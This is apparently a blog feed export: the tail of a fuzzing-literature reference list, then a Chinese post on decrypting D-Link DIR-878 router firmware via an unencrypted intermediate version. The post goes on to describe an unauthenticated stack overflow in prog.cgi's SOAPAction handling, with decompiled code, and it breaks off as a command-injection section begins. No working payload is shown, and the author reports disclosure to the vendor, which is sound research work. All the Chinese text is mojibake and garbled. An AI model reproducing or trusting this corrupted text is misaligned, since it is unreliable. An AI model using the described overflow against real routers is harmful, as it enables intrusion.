AD, Jana S (2017) Slowfuzz: Automated<br>domain-independent detection of algorithmic complexity vulnerabilities. In: Proceeding CCS â€™17 Proceedings of the 2017 ACM SIGSAC Conference on Computer and Communications Security. ACM, New York.<br>pp 2155â€“2168. <a class="link"   href="https://doi.org/10.1145/3133956.3134073" >https://doi.org/10.1145/3133956.3134073<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br>Rajpal M, Blum W, Singh R (2017) Not all bytes are equal: Neural byte sieve for fuzzing. arXiv preprint arXiv:1711.04596<br>Rawat S, Jain V, Kumar A, Cojocar L, Giuffrida C, Bos H (2017) Vuzzer: Application-aware evolutionary fuzzing. In: Proceedings of the Network and Distributed System Security Symposium (NDSS). <a class="link"   href="https://www.vusec/" >https://www.vusec<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>. net&#x2F;download&#x2F;?t&#x3D;papers&#x2F;vuzzer_ndss17.pdf Schumilo S, Aschermann C, Gawlik R, Schinzel S, Holz T (2017) kAFL: Hardware-assisted feedback fuzzing for OS kernels. In: Kirda E, Ristenpart T (eds). 26th USENIX Security Symposium, USENIX Security 2017. USENIX Association, Vancouver. pp 167â€“182<br>Serebryany K, Bruening D, Potapenko A, Vyukov D (2012) Addresssanitizer: A fast address sanity checker. In: Proceeding USENIX ATCâ€™12 Proceedings of the 2012 USENIX conference on Annual Technical Conference. USENIX Association, Berkeley. pp 309â€“318<br>Serebryany K, Iskhodzhanov T (2009) Threadsanitizer: data race detection in practice. In: Proceedings of the Workshop on Binary Instrumentation and Applications. pp 62â€“71<br>Shirey RW (2000) Internet security glossary. <a class="link"   href="https://tools.ietf.org/html/rfc2828" >https://tools.ietf.org/html/rfc2828<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>. Accessed 25 Dec 2017<br>Stephenfewer (2016) Grinder. <a class="link"   href="https://github.com/stephenfewer/grinder" >https://github.com/stephenfewer/grinder<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>. Accessed 25 Dec 2017<br>Stephens N, Grosen J, Salls C, Dutcher A, Wang R, Corbetta J, Shoshitaishvili Y, Kruegel C, Vigna G (2016) Driller: Augmenting fuzzing through selective symbolic execution. In: NDSS, volume 16, San Diego. pp 1â€“16<br>Sutton M, Greene A, Amini P (2007) Fuzzing: brute force vulnerability discovery. Pearson Education, Upper Saddle River<br>Takanen A, Demott JD, Miller C (2008) Fuzzing for software security testing and quality assurance. Artech House<br>The Clang Team (2017) Dataflowsanitizer. <a class="link"   href="https://clang.llvm.org/docs/" >https://clang.llvm.org/docs/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>DataFlowSanitizerDesign.html. Accessed 25 Dec 2017<br>The Clang Team (2017) Leaksanitizer. <a class="link"   href="https://clang.llvm.org/docs/" >https://clang.llvm.org/docs/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>LeakSanitizer.html. Accessed 25 Dec 2017<br>Van Sprundel I (2005) Fuzzing: Breaking software in an automated fashion. Decmember 8th<br>Vyukov D (2015) Syzkaller. <a class="link"   href="https://github.com/google/syzkaller" >https://github.com/google/syzkaller<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>. Accessed 25 Dec 2017<br>Wang J, Chen B, Wei L, Liu Y (2017) Skyfire: Data-driven seed generation for fuzzing. In: Security and Privacy (SP), 2017 IEEE Symposium on. IEEE, San Jose. <a class="link"   href="https://doi.org/10.1109/SP.2017.23" >https://doi.org/10.1109/SP.2017.23<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br>Wang S, Nam J, Tan L (2017) Qtep: quality-aware test case prioritization. In: Proceedings of the 2017 11th Joint Meeting on Foundations of Software Engineering. ACM, New York. pp 523â€“534. <a class="link"   href="https://doi.org/10.1145/" >https://doi.org/10.1145/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>3106237.3106258<br>Wang T, Wei T, Gu G, Zou W (2010) Taintscope: A checksum-aware directed fuzzing tool for automatic software vulnerability detection. In: Security and privacy (SP) 2010 IEEE symposium on. IEEE, Berkeley. pp 497â€“512. https:&#x2F;&#x2F; <a class="link"   href="http://doi.org/10.1109/SP.2010.37" >doi.org&#x2F;10.1109&#x2F;SP.2010.37<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br>Wichmann BA, Canning AA, Clutterbuck DL, Winsborrow LA, Ward NJ, Marsh DWR (1995) Industrial perspective on static analysis. Softw Eng J 10(2):69â€“75<br>Wikipedia, Wannacry ransomware attack (2017). <a class="link"   href="https://en.wikipedia.org/wiki/" >https://en.wikipedia.org/wiki/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>WannaCry_ransomware_attack. Accessed 25 Dec 2017<br>Wikipedia (2017) Dynamic program analysis. <a class="link"   href="https://en.wikipedia.org/wiki/" >https://en.wikipedia.org/wiki/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>Dynamic_program_analysis. Accessed 25 Dec 2017<br>Wu Z-Y, Wang H-C, Sun L-C, Pan Z-L, Liu J-J (2010) Survey of fuzzing. Appl Res Comput 27(3):829â€“832<br>Xu W, Kashyap S, Min C, Kim T (2017) Designing new operating primitives to improve fuzzing performance. In: Proceeding CCS â€™17 Proceedings of the 2017 ACM SIGSAC Conference on Computer and Communications Security. ACM, New York. pp 2313â€“2328. <a class="link"   href="https://doi.org/10.1145/3133956" >https://doi.org/10.1145/3133956<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>. 3134046<br>Yang Q, Li JJ, Weiss DM (2007) A survey of coverage-based testing tools. The Computer Journal 52(5):589â€“597<br>Zalewski, M (2017) American fuzzy lop. <a class="link"   href="http://lcamtuf.coredump.cx/afl/" >http://lcamtuf.coredump.cx/afl/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>. Accessed 25 Dec 2017<br>Zalewski M (2017) Afl technical details. <a class="link"   href="http://lcamtuf.coredump.cx/afl/" >http://lcamtuf.coredump.cx/afl/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>technical_details.txt. Accessed 25 Dec 2017<br>Zimmer D (2013) Comraider. <a class="link"   href="http://sandsprite.com/tools.php?id=16" >http://sandsprite.com/tools.php?id=16<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>. Accessed 25 Dec 2017<br>translateï¼šCataLpa</p>
]]></content>
      <categories>
        <category>MISC</category>
      </categories>
  </entry>
  <entry>
    <title>å®¶ç”¨è·¯ç”±å™¨å›ºä»¶å¸¸ç”¨è§£åŒ…æ–¹æ³• &amp; D-Link DIR-878 BUGS</title>
    <url>/2019/09/18/D-Link_BUG/</url>
    <content><![CDATA[<p>DIR-878 æ˜¯å‹è®¯ç§‘æŠ€ç”Ÿäº§çš„å®¶ç”¨è·¯ç”±å™¨ã€‚</p>
<span id="more"></span>

<h2 id="å®¶ç”¨è·¯ç”±å™¨å›ºä»¶å¸¸ç”¨è§£åŒ…æ–¹æ³•"><a href="#å®¶ç”¨è·¯ç”±å™¨å›ºä»¶å¸¸ç”¨è§£åŒ…æ–¹æ³•" class="headerlink" title="å®¶ç”¨è·¯ç”±å™¨å›ºä»¶å¸¸ç”¨è§£åŒ…æ–¹æ³•"></a>å®¶ç”¨è·¯ç”±å™¨å›ºä»¶å¸¸ç”¨è§£åŒ…æ–¹æ³•</h2><p>æŸäº›å‚å•†ä¸ºäº†ä¿æŠ¤è‡ªå·±çš„äº§å“ï¼Œå¢åŠ é€†å‘åˆ†æçš„æˆæœ¬ï¼Œé€šå¸¸ä¼šå°†è·¯ç”±å™¨çš„å›ºä»¶è¿›è¡ŒåŠ å¯†ï¼Œç»è¿‡åŠ å¯†çš„å›ºä»¶ä½¿ç”¨ä¸€èˆ¬çš„è§£åŒ…æ–¹æ³•ä¸èƒ½æå–ã€‚è¦æƒ³åˆ†æè¿™ç§å›ºä»¶ï¼Œé¦–å…ˆå°±è¦æ‰¾åˆ°å…¶å¯¹åº”çš„åŠ å¯†æ–¹æ³•ã€‚</p>
<p>å®é™…ä¸Šå›ºä»¶åŠ å¯†å¹¶ä¸æ˜¯éšéšä¾¿ä¾¿æ‹¿æ¥ä¸€ç§ç®—æ³•å°±å¯ä»¥çš„ï¼Œç”±äºå®¶ç”¨è·¯ç”±å™¨æœºèƒ½æœ‰é™ï¼Œæ‰€ä»¥ RSA ç­‰æ•ˆç‡è¾ƒä½çš„åŠ å¯†ä½“ç³»ç”¨çš„æ¯”è¾ƒå°‘ï¼ŒAES æˆ–è€… RC4 è¿™äº›æ•ˆç‡é«˜çš„ç®—æ³•é€šå¸¸æ˜¯é¦–é€‰çš„å›ºä»¶åŠ å¯†æ‰‹æ®µã€‚</p>
<p><strong>å®¶ç”¨è·¯ç”±å™¨å›ºä»¶åŠ å¯†åŸç†</strong></p>
<p>å½“ä¹°å›æ¥ä¸€å°è·¯ç”±å™¨çš„æ—¶å€™ï¼Œå…¶å†…éƒ¨çš„å›ºä»¶ç‰ˆæœ¬é€šå¸¸ä¸æ˜¯æœ€æ–°çš„ï¼Œè¿™æ—¶å°±éœ€è¦è¿›è¡Œå›ºä»¶å‡çº§ï¼Œå‡çº§çš„åŸç†å¾ˆç®€å•ï¼Œä»å®˜æ–¹ç½‘ç«™ä¸‹è½½æœ€æ–°ç‰ˆæœ¬çš„å›ºä»¶ï¼Œç„¶åå¯¹å›ºä»¶è¿›è¡Œæ£€éªŒï¼Œæ»¡è¶³æŸäº›æ¡ä»¶ä¹‹åè§£å‹å›ºä»¶æ›¿æ¢åŸå§‹æ–‡ä»¶ã€‚</p>
<p>ç°åœ¨çš„é—®é¢˜æ˜¯å¦‚æœä¸‹è½½åˆ°çš„å›ºä»¶æ˜¯åŠ å¯†çš„ï¼Œè·¯ç”±å™¨å†…éƒ¨åº”è¯¥å¦‚ä½•è§£å¯†å‘¢ï¼Ÿ</p>
<p>æœ€ç®€å•çš„æƒ³æ³•å°±æ˜¯å†…éƒ¨æ”¾ç½®äº†å¯¹åº”çš„è§£å¯†ç¨‹åºï¼Œå¯ä»¥å…ˆè§£å¯†å›ºä»¶å†æ‰§è¡Œæ­£å¸¸çš„å‡çº§è¿‡ç¨‹ã€‚è¿™é‡Œå°±å¼•å‡ºäº†å®¶ç”¨è·¯ç”±å™¨å›ºä»¶åŠ å¯†çš„å‡ ç§å¸¸è§å½¢å¼ï¼š</p>
<p>ç¬¬ä¸€ç§ï¼š å›ºä»¶ä»è®¾å¤‡æ¨å‡ºå°±å¤„äºåŠ å¯†çŠ¶æ€ï¼Œåœ¨æ›´æ¢å›ºä»¶åŠ å¯†ç®—æ³•çš„æ—¶å€™ä¼šæ¶‰åŠåˆ°ä¸­é—´ç‰ˆæœ¬ï¼Œæ›´æ¢é€»è¾‘å¦‚ä¸‹ï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/D-LinkBUG1.png"
                     
                ></p>
<p>ç¬¬äºŒç§ï¼š å›ºä»¶åœ¨å‡ºå‚çš„æ—¶å€™ç”±äºæŸäº›åŸå› æ²¡æœ‰é‡‡ç”¨åŠ å¯†ç®—æ³•ï¼Œåœ¨ä¸­é—´æŸä¸€ä¸ªç‰ˆæœ¬çªç„¶è¦å¢åŠ å›ºä»¶åŠ å¯†ï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/D-LinkBUG2.png"
                     
                ></p>
<p>è¿˜æœ‰ä¸€ç§æ›´æ¢é€»è¾‘æ˜¯ï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/D-LinkBUG3.png"
                     
                ></p>
<p>å‰åºç‰ˆæœ¬è¿›è¡Œäº†åŠ å¯†ï¼Œä½†ä¸­é—´ç‰ˆæœ¬æä¾›äº†æœªåŠ å¯†çš„ç¨‹åºã€‚</p>
<p>å…¶ä¸­ç¬¬ä¸€ç§æ–¹æ³•è§£åŒ…æ¯”è¾ƒå›°éš¾ï¼Œä¸­é—´ç‰ˆæœ¬ä¹Ÿæ˜¯ç»è¿‡åŠ å¯†çš„ï¼Œå¦‚æœæƒ³è¦è§£å¯†å›ºä»¶å°±å¿…é¡»å…ˆä»çœŸæœºä¸Šæ‹¿åˆ°è§£å¯†ä¹‹åçš„å†…å®¹è¿›è¡Œé€†å‘åˆ†æï¼Œå¯»æ‰¾å›ºä»¶åŠ å¯†æ–¹å¼ã€‚</p>
<p>å…¶ä½™ä¸¤ç§å°±æ¯”è¾ƒç®€å•äº†ï¼Œé€šè¿‡ä¸­é—´ç‰ˆæœ¬èƒ½ç›´æ¥æ‹¿åˆ°å›ºä»¶çš„è§£å¯†ç¨‹åºæˆ–è€…ç®—æ³•ï¼Œé€šè¿‡ç®—æ³•å†å»è§£å¯†æ–°çš„å›ºä»¶ã€‚</p>
<p>ä»¥æˆ‘ä»¬ä»Šå¤©çš„ä¸»è§’ DIR-878 ä¸ºä¾‹ï¼Œå®ƒæ‰€é‡‡ç”¨çš„æ˜¯ä¸Šè¿°ç¬¬ä¸‰ç§è¿­ä»£æ–¹æ³•ï¼Œå³ä¸­é—´ç‰ˆæœ¬æ²¡æœ‰åŠ å¯†ï¼Œå¯ä»¥é€è¿‡ binwalk ç›´æ¥è·å–å›ºä»¶ã€‚</p>
<p>é¦–å…ˆä»å®˜ç½‘ <a class="link"   href="ftp://ftp2.dlink.com/PRODUCTS/DIR-878/REVA/" >ftp://ftp2.dlink.com/PRODUCTS/DIR-878/REVA/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> ä¸‹è½½æ‰€æœ‰èƒ½çœ‹è§çš„å›ºä»¶ï¼Œå› ä¸ºæˆ‘ä»¬ä¸çŸ¥é“å“ªä¸ªç‰ˆæœ¬æ˜¯ä¸­é—´ç‰ˆæœ¬ã€‚</p>
<p>ä¸‹è½½å›ºä»¶ä¹‹ååˆä¸€ä¸ªåˆ¤æ–­ä¸­é—´ç‰ˆæœ¬çš„æŠ€å·§ï¼Œé‚£å°±æ˜¯åˆ©ç”¨ binwalk çš„ -E é€‰é¡¹ï¼Œå¤§è‡´åŸç†å°±æ˜¯ä¸€ä¸ªç³»ç»Ÿè¶Šæœ‰åºï¼Œå…¶ç†µå€¼å°±è¶Šä½ï¼Œç»è¿‡åŠ å¯†çš„å›ºä»¶å±äºæ— åºåº¦å¾ˆå¤§çš„ç³»ç»Ÿï¼Œæ‰€ä»¥ -E çš„ç»“æœé€šå¸¸æ˜¯ä¸€æ ¹ç›´çº¿ã€‚</p>
<p>ä¸è¿‡å¯¹äº 878 çš„å›ºä»¶ä¸ç”¨é‚£ä¹ˆéº»çƒ¦ï¼Œä¾æ¬¡è§£å‹+binwalk åˆ†æå›ºä»¶ï¼Œæœ€ç»ˆåœ¨ 1.10B05 è¿™ä¸ªå‹ç¼©åŒ…ä¸­è·å–åˆ°äº†ä¸­é—´ç‰ˆæœ¬çš„å›ºä»¶ï¼šDIR878A1_FW104B05_Middle_FW_Unencrypt</p>
<p>binwalk è§£åŒ…å³å¯å¾—åˆ°å¯¹åº”çš„æ–‡ä»¶ç³»ç»Ÿã€‚å¹¶ä¸”ç»è¿‡è¿›ä¸€æ­¥æŸ¥çœ‹ï¼Œä»…ä»…åœ¨è¿™ä¸ªç‰ˆæœ¬æ›´æ¢äº†åŠ å¯†ç®—æ³•ï¼Œæ‰€ä»¥æœ€æ–°ç‰ˆæœ¬çš„å›ºä»¶ä¹Ÿå¯ä»¥åˆ©ç”¨æ­¤å›ºä»¶ä¸­çš„ç®—æ³•è§£å¯†ã€‚</p>
<p>æˆ‘ä»¬æ‰¾åˆ°äº†ä¸­é—´ç‰ˆæœ¬ï¼Œç°åœ¨çš„é—®é¢˜æ˜¯å»å“ªé‡Œå¯»æ‰¾è§£å¯†ç¨‹åºï¼ŸæŒ‰ç…§å›ºä»¶å‡çº§çš„æ€è·¯ï¼Œè‚¯å®šæœ‰ä¸€ä¸ªå‡çº§ç¨‹åºï¼Œåœ¨è¿™ä¸ªç¨‹åºå†…éƒ¨å¯èƒ½å­˜åœ¨ç€åŠ å¯†ç®—æ³•ï¼Œæˆ‘ä»¬é¦–è¦ç›®çš„å°±æ˜¯å»å¯»æ‰¾è¿™ä¸ªå‡çº§ç¨‹åºã€‚</p>
<p>ä¸è¿‡å¯¹äº 878 è¿™å°è·¯ç”±å™¨ï¼Œæˆ‘ä»¬çš„å·¥ä½œé‡å¯ä»¥å¤§å¤§ç¼©å‡ï¼Œæˆ‘åœ¨ç¿»æ‰¾ç¨‹åºç›®å½•çš„æ—¶å€™ï¼Œå‘ç°äº†ä¸€ä¸ªåä¸º imgdecrypt çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå°±ä½äº &#x2F;bin æ–‡ä»¶å¤¹ä¸‹é¢ã€‚</p>
<p>è¿™æ˜¯è¸ç ´é“é‹æ— è§…å¤„çš„æœ€å¥½ä»£è¡¨(hh)ï¼Œçœ‹åå­—å°±çŸ¥é“æ˜¯ç”¨æ¥è§£å¯†é•œåƒçš„ï¼Œç”¨ä¸‹é¢çš„å‘½ä»¤æ¨¡æ‹Ÿè¿è¡Œ</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">qemu-mipsel -L . ./bin/imgdecrypt</span><br></pre></td></tr></table></figure></div>

<p>è¾“å‡º</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">./bin/imgdecrypt &lt;sourceFile&gt;</span><br></pre></td></tr></table></figure></div>

<p>ç”¨æœ€æ–°ç‰ˆçš„å›ºä»¶æ¥è¯•ä¸€ä¸‹ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">qemu-mipsel -L . ./bin/imgdecrypt ./DIR_878_FW120B05.BIN</span><br></pre></td></tr></table></figure></div>

<p>æ‰§è¡Œåå†ç”¨ binwalk æ£€æµ‹å‘ç°è§£å¯†æˆåŠŸï¼Œè‡³æ­¤æˆ‘ä»¬å°±å¯ä»¥æˆåŠŸæå–ä¸­é—´ç‰ˆæœ¬ä¹‹åä»»æ„ä¸€ä¸ªç‰ˆæœ¬çš„å›ºä»¶äº†(åªè¦æœªæ¥ä¸æ›´æ¢åŠ å¯†ç®—æ³•)ï¼</p>
<h2 id="æ¼æ´1-æœªæˆæƒç”¨æˆ·æ„é€ æ¶æ„è¯·æ±‚é€ æˆæ ˆæº¢å‡º"><a href="#æ¼æ´1-æœªæˆæƒç”¨æˆ·æ„é€ æ¶æ„è¯·æ±‚é€ æˆæ ˆæº¢å‡º" class="headerlink" title="æ¼æ´1 æœªæˆæƒç”¨æˆ·æ„é€ æ¶æ„è¯·æ±‚é€ æˆæ ˆæº¢å‡º"></a>æ¼æ´1 æœªæˆæƒç”¨æˆ·æ„é€ æ¶æ„è¯·æ±‚é€ æˆæ ˆæº¢å‡º</h2><p>ç”±äºæ¥ä¸‹æ¥çš„ä¸¤æšæ¼æ´åˆæ­¥çœ‹æ˜¯ 0dayï¼Œæ‰€ä»¥æ•æ„Ÿä¿¡æ¯ä¼šè¿›è¡Œéšè—ï¼Œæ¼æ´å·²ç»æŠ¥å‘Šå‚å•†ã€‚</p>
<p>æˆ‘ä»¬æ‹¿åˆ°æœ€æ–°ç‰ˆæœ¬(1.20 2019-7) çš„å›ºä»¶è¿›è¡Œè§£å¯†ã€è§£åŒ…ï¼Œå¾—åˆ°æ–‡ä»¶ç³»ç»Ÿï¼Œåœ¨ etc_ro ç›®å½•ä¸‹é¢çœ‹åˆ°å¾ˆå¤šå’ŒæœåŠ¡ç›¸å…³çš„æ–‡ä»¶ï¼Œåˆæ­¥åˆ¤å®šè¿™æ˜¯è·¯ç”±å™¨çš„æ ¸å¿ƒæ–‡ä»¶ç›®å½•ã€‚</p>
<p>etc_ro ç›®å½•ä¸‹æœ‰ä¸€ä¸ªåä¸º lighttpd çš„æ–‡ä»¶å¤¹ï¼Œlighttpd æ˜¯ä¸€ä¸ªè½»é‡çº§çš„ web æœåŠ¡å™¨ï¼Œè¿›å»ä¹‹åå‘ç°å…¶é…ç½®æ–‡ä»¶ lighttpd.confï¼Œåˆæ­¥åˆ†æé…ç½®æ–‡ä»¶ï¼Œå‘ç°å‡ ä¹æ‰€æœ‰ web è¯·æ±‚éƒ½è¢«å®šå‘åˆ°äº† &#x2F;bin ç›®å½•ä¸‹çš„ prog.cgi ä¸­ã€‚</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">fastcgi.server = ( </span><br><span class="line">	&quot;/HNAP1/&quot; =&gt; </span><br><span class="line">	((</span><br><span class="line">		&quot;socket&quot; =&gt; &quot;/var/prog.fcgi.socket-0&quot;,</span><br><span class="line">		&quot;check-local&quot; =&gt; &quot;enable&quot;,</span><br><span class="line">		&quot;bin-path&quot; =&gt; &quot;/bin/prog.cgi&quot;,</span><br><span class="line">		&quot;idle-timeout&quot; =&gt; 10,</span><br><span class="line">		&quot;min-procs&quot; =&gt; 1,</span><br><span class="line">		&quot;max-procs&quot; =&gt; 1</span><br><span class="line">	)), </span><br><span class="line">	&quot;.fcgi&quot; =&gt; </span><br><span class="line">	((</span><br><span class="line">		&quot;socket&quot; =&gt; &quot;/var/prog.fcgi.socket-0&quot;,</span><br><span class="line">		&quot;check-local&quot; =&gt; &quot;enable&quot;,</span><br><span class="line">		&quot;bin-path&quot; =&gt; &quot;/bin/prog.cgi&quot;,</span><br><span class="line">		&quot;idle-timeout&quot; =&gt; 10,</span><br><span class="line">		&quot;min-procs&quot; =&gt; 1,</span><br><span class="line">		&quot;max-procs&quot; =&gt; 1</span><br><span class="line">	))</span><br><span class="line">)</span><br></pre></td></tr></table></figure></div>

<p>file æŸ¥çœ‹ cgi çš„æ–‡ä»¶æ ¼å¼ï¼Œæ˜¯ MIPS32 å°ç«¯æ¶æ„ã€‚åˆæ­¥æƒ³æ³•æ˜¯å…ˆæŠŠå›ºä»¶æ¨¡æ‹Ÿèµ·æ¥ï¼Œç„¶åå¯¹ç…§åŠŸèƒ½å»è°ƒè¯•ï¼Œä½†æ˜¯æˆ‘è¯•äº†å¾ˆå¤šæ–¹æ³•ï¼ŒåŒ…æ‹¬ firmadyneã€qemu å…¨æ¨¡æ‹Ÿã€å•æ–‡ä»¶æ¨¡æ‹Ÿç­‰ç­‰ï¼Œéƒ½è¾¾ä¸åˆ°ç†æƒ³çš„æ•ˆæœã€‚åªå¥½è´­ä¹°çœŸæœºæ¥è¿›è¡Œæµ‹è¯•ã€‚</p>
<p>ç¬¬ä¸€ä¸ªæ¼æ´å‡ºç°åœ¨ prog.cgi çš„ main å‡½æ•°ä¸­ï¼Œæ˜¯å¤„ç† HNAP è¯·æ±‚çš„ç¬¬ä¸€ä¸ªå‡½æ•°ã€‚åœ¨è¿™ä¸ªå‡½æ•°ä¸­å­˜åœ¨æ ˆæº¢å‡ºï¼Œå¹¶ä¸”ä¸éœ€è¦ç”¨æˆ·èº«ä»½è®¤è¯å³å¯è§¦å‘ã€‚</p>
<p>main å‡½æ•°æŸå¤„å­˜åœ¨è¿™æ ·çš„ä»£ç </p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">  __s1 = <span class="built_in">strstr</span>((<span class="type">char</span> *)piVar5[<span class="number">0x31</span>],<span class="string">&quot;method=&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (__s1 == (<span class="type">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">    __s1 = <span class="built_in">strstr</span>((<span class="type">char</span> *)piVar5[<span class="number">0x35</span>],<span class="string">&quot;http://purenetworks.com&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (__s1 == (<span class="type">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">      iVar3 = bstrdupNoBalloc(piVar5[<span class="number">0x31</span>],<span class="string">&quot;fastcgi.c&quot;</span>,<span class="number">0xf2</span>);</span><br><span class="line">      piVar5[<span class="number">0x31</span>] = iVar3;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      __s1 = __s1 + <span class="number">0x17</span>;</span><br><span class="line">      __haystack = <span class="built_in">strchr</span>(__s1,<span class="number">0x22</span>);</span><br><span class="line">      <span class="keyword">if</span> (__haystack == (<span class="type">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">        iVar3 = bstrdupNoBalloc(__s1,<span class="string">&quot;fastcgi.c&quot;</span>,<span class="number">0xef</span>);</span><br><span class="line">        piVar5[<span class="number">0x31</span>] = iVar3;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">memset</span>(&amp;cStack1292,<span class="number">0</span>,<span class="number">0xfe</span>);</span><br><span class="line">        <span class="built_in">strncpy</span>(&amp;cStack1292,__s1,(<span class="type">size_t</span>)(__haystack + -(<span class="type">int</span>)__s1));</span><br><span class="line">        iVar3 = bstrdupNoBalloc(&amp;cStack1292,<span class="string">&quot;fastcgi.c&quot;</span>,<span class="number">0xed</span>);</span><br><span class="line">        piVar5[<span class="number">0x31</span>] = iVar3;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>

<p>æ˜¯ç”¨äºå¤„ç† HNAP çš„ SOAPaction å­—æ®µçš„ï¼Œä»”ç»†è§‚å¯Ÿå‘ç° strncpy å‡½æ•°çš„é•¿åº¦å­—æ®µæ˜¯ç”¨æˆ·å¯æ§çš„ï¼Œå®ƒçš„è®¡ç®—é€»è¾‘æ˜¯åˆ©ç”¨ strchr å‡½æ•°ä» SOAPaction å­—æ®µå®šä½å­—ç¬¦ â€œ ,ç„¶ååˆ©ç”¨æŒ‡é’ˆå‡æ³•è¿ç®—å¾—åˆ°æ•´ä¸ªå­—ç¬¦ä¸²çš„é•¿åº¦ã€‚æ˜¾ç„¶å¦‚æœæ¶æ„ç”¨æˆ·æ„é€ ä¸€ä¸ªè¶…é•¿çš„å­—ç¬¦ä¸²ä¼ å…¥è¯·æ±‚å¤´ï¼Œå°±ä¼šè§¦å‘ strncpy å‡½æ•°æ‹·è´å¾ˆé•¿çš„å†…å®¹åˆ° stack ç©ºé—´ï¼Œè¿™æ ·ä¼šç ´åå…¶ä»–å‡½æ•°çš„æ ˆå¸§ï¼Œä½¿ç¨‹åºå´©æºƒã€‚</p>
<p>ç”±äºæˆ‘ç°åœ¨æ²¡æœ‰åˆé€‚çš„è°ƒè¯•ç¯å¢ƒï¼Œæ‰€ä»¥æš‚æ—¶æ— æ³•ç¡®å®šæ˜¯å¦èƒ½å¤Ÿåˆ©ç”¨æ­¤å¤„æ¼æ´è¾¾åˆ° RCE çš„åŠŸèƒ½ï¼Œä½†æ˜¯è€ƒè™‘åˆ°æº¢å‡ºä»»æ„å­—ç¬¦æ•°é‡ï¼ŒRCE åº”è¯¥æ˜¯å¯è¡Œçš„ã€‚</p>
<p>åˆæ­¥æµ‹è¯•å¦‚æœä¸€ç›´å‘è·¯ç”±å™¨å‘é€ç•¸å½¢æ•°æ®åŒ…ï¼Œä¼šå¯¼è‡´ç®¡ç†é¡µé¢ 500 æˆ– 503 å´©æºƒã€‚</p>
<h2 id="æ¼æ´2-æˆæƒç”¨æˆ·å‘½ä»¤æ³¨å…¥"><a href="#æ¼æ´2-æˆæƒç”¨æˆ·å‘½ä»¤æ³¨å…¥" class="headerlink" title="æ¼æ´2 æˆæƒç”¨æˆ·å‘½ä»¤æ³¨å…¥"></a>æ¼æ´2 æˆæƒç”¨æˆ·å‘½ä»¤æ³¨å…¥</h2><p>è¿™ä¸ªæ¼æ´æ¯”è¾ƒæœ‰è¶£ï¼Œå®ƒæ˜¯åœ¨ 2019 å¹´ 6 æœˆå·¦å³å·²ç»è¢«æäº¤çš„æ¼æ´ï¼Œå‚å•†ä¹Ÿå‘å¸ƒäº†å¯¹åº”çš„è¡¥ä¸ï¼Œä½†æ˜¯ç”±äºè¡¥ä¸çš„ä¿®å¤æ•ˆæœæœ‰é™ï¼Œé—®é¢˜ä¾ç„¶å­˜åœ¨ã€‚</p>
<p>DIR-878 è·¯ç”±å™¨æœ‰å¾ˆå¤šåŠŸèƒ½ï¼Œå…¶ä¸­ç«™ç‚¹è¿‡æ»¤åŠŸèƒ½å…è®¸ç”¨æˆ·æ·»åŠ ç‰¹å®šçš„ç½‘ç«™è¿›è¡Œæ‹¦æˆªï¼Œæ”¾ç½®å…¶ä»–ç”¨æˆ·è®¿é—®ã€‚</p>
